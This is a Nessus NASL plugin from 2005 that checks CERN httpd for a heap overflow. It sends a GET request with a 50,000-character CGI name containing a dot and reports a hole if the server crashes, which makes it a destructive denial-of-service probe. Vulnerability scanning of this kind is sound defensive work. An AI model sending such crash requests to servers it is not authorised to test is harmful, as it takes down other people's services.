#
# This script was written by Michel Arboi <mikhail@nessus.org>
#
# It is released under the GPL
# Enjoy and stop complaining about Nessus moving commercial.
#

if(description)
{
 script_id(17231);
 script_version ("$Revision: 1.5 $");
 name["english"] = "CERN httpd CGI name heap overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the remobe
web server by requesting 
	GET /cgi-bin/A.AAAA[...]A HTTP/1.0
	
This is known to trigger a heap overflow in some servers like
CERN HTTPD. 
A cracker may use this flaw to disrupt your server. It *might* 
also be exploitable to run malicious code on the machine.

Solution : Ask your vendor for a patch or move to another server

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Ask for a too long CGI name containing a dot";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 # script_require_keys("www/cern");
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

# I never tested it against a vulnerable server

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if (http_is_dead(port: port)) exit(0);

foreach dir (cgi_dirs())
{
  d = strcat(dir, '/A.', crap(50000));
  req = http_get(item:d, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL && http_is_dead(port:port))
  {
    debug_print('HTTP server was killed by GET http://', get_host_name(), ':',
	port, '/', dir, '/A.AAAAAAA[...]A\n');
    security_hole(port);
    exit(0);
  }
}

